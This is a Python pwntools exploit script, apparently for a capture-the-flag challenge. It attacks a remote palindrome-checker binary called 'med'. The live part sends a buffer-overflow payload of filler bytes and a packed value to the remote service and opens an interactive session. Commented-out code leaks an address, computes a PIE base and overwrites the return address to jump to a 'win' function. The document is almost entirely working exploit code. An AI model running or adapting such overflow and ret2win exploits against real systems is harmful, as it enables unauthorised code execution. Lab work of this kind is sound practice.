from pwn import *
import string
context.log_level = "debug"
context.binary = ELF('./med')
p = remote("sisterlab.id", 42005)
# p = process("./med")
payload = b"A"*16+b"B"*16+b"C"*16
payload += p64(0x99)
payload = payload[:-7]




p.recvuntil(b"=== String Palindrome Checker ===Enter your string:")
p.sendline(payload)
# p.recvuntil(b"It's not like you can bypass this anyway!\n") 
# p.sendline(payload2)



# p.recvuntil(b"=== String Palindrome Checker ===Enter your string:")
# p.sendline("a")
# a = p.recvuntil("not palindromes")
# a = a[49:]
# a = a[:6]
# print("this a: ",a)

# a = u64(a.ljust(8, b'\x00'))
# offset = a - 4557
# win = offset+0x1199

# print("this is win: ",hex(win))
# print("this is offset: ",hex(offset))

# payload3 = b"A"*72
# payload3 += p64(win)




# p.recvuntil(b"=== String Palindrome Checker ===Enter your string:")
# p.sendline(payload)
# p.recvuntil(b"It's not like you can bypass this anyway!\n")
# p.sendline(payload3)

p.interactive()